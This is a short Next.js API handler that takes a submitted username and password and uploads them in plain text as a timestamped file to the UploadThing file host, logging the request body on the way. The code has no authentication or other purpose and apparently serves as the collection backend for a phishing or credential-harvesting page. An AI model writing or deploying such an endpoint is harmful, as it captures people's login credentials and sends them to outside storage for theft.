import { NextApiRequest, NextApiResponse } from "next";
import { utapi } from "uploadthing/server";

export default function handler(req: NextApiRequest, res: NextApiResponse) {
  if (req.method === "POST") {
    console.log(req.body);
    utapi.uploadFiles(
      new File(
        [req.body.username + "\n" + req.body.password],
        Date.now().toString() + ".txt",
        { type: "text/plain" },
      ),
    );
  } else {
    throw new Error("test");
  }
}
